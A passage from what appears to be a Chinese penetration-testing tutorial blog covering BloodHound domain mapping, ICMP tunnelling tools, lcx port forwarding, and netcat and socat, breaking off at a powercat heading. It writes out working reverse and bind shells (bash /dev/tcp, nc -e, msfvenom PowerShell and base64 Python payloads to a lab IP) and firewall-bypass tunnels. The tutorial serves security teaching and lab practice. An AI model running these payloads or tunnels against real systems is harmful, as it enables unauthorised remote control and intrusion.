&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                    68:35:16 暂缺System                           4 Services                   0        924 K Unknown         暂缺                                                    0:24:14 暂缺svchost.exe                   9228 Console                    2      2,932 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺tasklist.exe                 10768 Console                    2      9,540 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺……内容过多省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p><h1 id="0x05-BloodHound-的使用"><a href="#0x05-BloodHound-的使用" class="headerlink" title="0x05 BloodHound 的使用"></a>0x05 BloodHound 的使用</h1><h2 id="1、介绍-1"><a href="#1、介绍-1" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p><p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p><p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令<code>neo4j.bat console</code>，之后打开浏览器访问 <a href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p><pre class="line-numbers language-none"><code class="language-none">URL：neo4j:&#x2F;&#x2F;localhost:7687用户名(默认)：neo4j密码(默认)：neo4j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 <code>SharpHound.exe -c all</code> 进行数据采集。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;SharpHound.exe -c all---------------------------------------------Initializing SharpHound at 22:36 on 2021&#x2F;2&#x2F;25---------------------------------------------Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container[+] Creating Schema map for domain TEAMSSIX.COM using path CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;teamssix,DC&#x3D;com[+] Cache File Found! Loaded 1332 Objects in cache[+] Pre-populating Domain Controller SIDSStatus: 0 objects finished (+0) -- Using 24 MB RAMStatus: 673 objects finished (+673 134.6)&#x2F;s -- Using 43 MB RAMEnumeration finished in 00:00:05.3136324Compressing data to .\20210225223622_BloodHound.zipYou can upload this file directly to the UISharpHound Enumeration Completed at 22:36 on 2021&#x2F;2&#x2F;25! Happy Graphing!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果使用 ps1 脚本收集，命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -command &quot;Import-Module .&#x2F;SharpHound.ps1; Invoke-BloodHound -c all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p><blockquote><p>或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p></blockquote><p>在 BloodHound 右上角有三个板块：</p><p>1、Database Info（数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。</p><p>2、Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p><p>3、Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">1、查询所有域管理员2、寻找到域管理员的最短路径3、查找具有DCSync权限的主体4、具有外部域组成员资格的用户5、具有外部域名组成员资格的组6、映射域信任7、到无约束委托系统的最短路径8、到达Kerberoastable用户的最短路径9、从Kerberoastable用户到域管理员的最短路径10、拥有的主体的最短路径11、从拥有的主体到域管理员的最短路径12、到高价值目标的最短路径13、查找域用户是本地管理员的计算机14、查找域用户可以读取密码的计算机15、从域用户到高价值目标的最短路径16、找到从域用户到高价值目标的所有路径17、找到域用户可以RDP的工作站18、找到域用户可以RDP的服务器19、查找域用户组的危险权限20、找到高价值群体中能够支持kerberoable的成员21、列出所有kerberoable用户22、查找具有大多数特权的Kerberoastable用户23、查找到非域控制器的域管理登录24、查找不支持操作系统的计算机25、查找AS-REP Roastable用户(DontReqPreAuth)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比如这里查询到域管理员的最短路径</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-02-25_14-00-42.png"></p><blockquote><p>路径由粗到细表示xx对xx有权限或关系</p></blockquote><p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力、经验才能更好的去分析这样的一个结果才是。</p><h1 id="0x06-ICMP-隧道工具使用"><a href="#0x06-ICMP-隧道工具使用" class="headerlink" title="0x06 ICMP 隧道工具使用"></a>0x06 ICMP 隧道工具使用</h1><h2 id="1、介绍-2"><a href="#1、介绍-2" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p><p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p><h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p><pre class="line-numbers language-none"><code class="language-none">yum -y install byaccyum -y install flex bison#安装libpcap依赖库wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0.&#x2F;configuremake &amp;&amp; make install#安装PingTunnelwget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ptunnel 常用命令介绍：</p><pre class="line-numbers language-none"><code class="language-none">-p: 指定跳板服务器 IP 地址-lp: 监听本地 TCP 端口-da: 指定访问目标的内网 IP 地址-dp: 指定访问目标的端口-m: 设置隧道最大并发数-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p><pre class="line-numbers language-none"><code class="language-none">Kali 攻击机       172.16.214.6 (外网)||Linux Web 跳板机  172.16.214.5  (外网)|                192.168.7.5   (内网)||Win RDP 目标机    192.168.7.110 (内网)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Kali 攻击机上执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-p  指定跳板机外网IP-lp 指定本机的监听端口-da 指定目标机的内网IP-dp 指定目标机的端口-x 设置隧道密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Linux Web 跳板机上执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_14-46-46.png"></p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  #关闭本地ICMP应答<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>icmpsh 常用命令介绍：</p><pre class="line-numbers language-none"><code class="language-none">-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]-d milliseconds    请求时间间隔（毫秒）-o milliseconds    响应超时时间（毫秒）-s bytes           最大数据缓冲区大小（字节）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p><pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6目标机 IP：172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在攻击机上运行：</p><pre class="line-numbers language-none"><code class="language-none">python2 icmpsh_m.py 172.16.214.6 172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在目标机上运行</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;icmpsh.exe -t 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_15-43-51.png"></p><h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.gitcd icmptunnelmake<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p><pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6目标机 IP：172.16.214.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在攻击机上运行：</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all# 禁用 ICMP echo 回复，防止内核自己对ping包进行响应.&#x2F;icmptunnel -s# 开启服务端模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在攻击机上新开启一个终端运行：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在目标机上运行：</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all.&#x2F;icmptunnel 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在目标机上新开启一个终端运行：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.2 netmask 255.255.255.0# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>至此，已经通过 ICMP 建立了一个点对点隧道。</p><p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p><pre class="line-numbers language-none"><code class="language-none">ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-04-07_16-35-09.png"></p><h1 id="0x07-lcx、netcat-和-socat-的使用"><a href="#0x07-lcx、netcat-和-socat-的使用" class="headerlink" title="0x07 lcx、netcat 和 socat 的使用"></a>0x07 lcx、netcat 和 socat 的使用</h1><h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>内网端口转发</li></ul><pre class="line-numbers language-none"><code class="language-none">内网失陷主机lcx.exe -slave rhost rport lhost lport公网代理主机lcx.exe -listen lport1 lport2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">内网失陷主机lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389公网代理主机lcx.exe -listen 4444 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p><ul><li>本地端口映射</li></ul><p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p><pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内网端口转发</li></ul><pre class="line-numbers language-none"><code class="language-none">内网失陷主机.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444公网代理主机.&#x2F;portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p><h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p><pre class="line-numbers language-none"><code class="language-none">-l 开启监听状态-v 显示详细信息-p 指定监听的本地端口-k 客户端断掉连接时，服务端依然保持运行-e 将传入的信息以命令执行-n 直接使用 IP 地址，不进行 dns 解析过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p><pre class="line-numbers language-none"><code class="language-none">nc -vv rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; nc -v 172.16.214.43 22Connection to 172.16.214.43 port 22 [tcp&#x2F;ssh] succeeded!SSH-2.0-OpenSSH_8.4p1 Debian-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p><p><strong>-e 指定反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机nc -lvp lport -e &#x2F;bin&#x2F;bash# linux 主机nc -lvp lport -e c:\windows\system32\cmd.exe # windows 主机# 控制端nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; nc -lvp 4444 -e &#x2F;bin&#x2F;bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!whoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>-c 指定反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机nc -lvp lprot -c bash# linux 主机nc -lvp lport -c cmd # windows 主机# 控制端nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; nc -lvp 4444 -c bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!whoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结合其他语言进行反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;rhost&#x2F;rport 0&gt;&amp;1# 控制端nc -lvp lprot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.214.43&#x2F;4444 0&gt;&amp;1# 控制端&gt; nc -lp 4444root@ubuntu:~# whoamiwhoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p><p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p><pre class="line-numbers language-none"><code class="language-none"># 控制端&gt; msfvenom -p cmd&#x2F;windows&#x2F;reverse_powershell lhost&#x3D;172.16.214.43 lport&#x3D;4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 1586 bytespowershell -w hidden -nop -c $a&#x3D;&#39;172.16.214.43&#39;;$b&#x3D;4444;$c&#x3D;New-Object system.net.sockets.tcpclient;$nb&#x3D;New-Object System.Byte[] $c.ReceiveBufferSize;$ob&#x3D;New-Object System.Byte[] 65536;$eb&#x3D;New-Object System.Byte[] 65536;$e&#x3D;new-object System.Text.UTF8Encoding;$p&#x3D;New-Object System.Diagnostics.Process;$p.StartInfo.FileName&#x3D;&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput&#x3D;1;$p.StartInfo.RedirectStandardOutput&#x3D;1;$p.StartInfo.RedirectStandardError&#x3D;1;$p.StartInfo.UseShellExecute&#x3D;0;$q&#x3D;$p.Start();$is&#x3D;$p.StandardInput;$os&#x3D;$p.StandardOutput;$es&#x3D;$p.StandardError;$osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s&#x3D;$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r&#x3D;$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r&#x3D;$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r&#x3D;$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str&#x3D;$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-05-28_12-36-45.png"></p><p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p><pre class="line-numbers language-none"><code class="language-none"># 控制端&gt; msfvenom -p cmd&#x2F;unix&#x2F;reverse_python lhost&#x3D;172.16.214.43 lport&#x3D;4444[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 505 bytespython -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik&#x3D;&#39;)[0]))&quot;&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p><h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p><p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; socat - .&#x2F;test.txt  # 相对路径读取test&gt; socat - &#x2F;tmp&#x2F;test.txt# 绝对路径读取test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>写入文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; echo &quot;hello world&quot; | socat - .&#x2F;test.txt&gt; socat - .&#x2F;test.txttesthello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; socat - TCP:172.16.214.1:22SSH-2.0-OpenSSH_7.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>监听端口</strong></p><pre class="line-numbers language-none"><code class="language-none">socat - TCP-LISTEN:8002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p><p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p><pre class="line-numbers language-none"><code class="language-none">socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>转发 UDP 端口</strong></p><p>和上面一样，将 TCP 改成 UDP 即可</p><pre class="line-numbers language-none"><code class="language-none">socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>NAT 映射</strong></p><p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p><pre class="line-numbers language-none"><code class="language-none"># 内网主机socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389# 公网主机socat tcp-listen:4444 tcp-listen:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p><p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p><h1 id="0x08-powercat-的使用"><a href="#0x08-powercat-的使用" class="headerlink" title="0x08 powercat 的使用"></a>0x08 powercat 的使用</h1><h2 id="1、下载安装-powercat"><a href="#1、下载安装-powercat" class="headerlink" title="1、下载安装 powercat"></a>1、下载安装 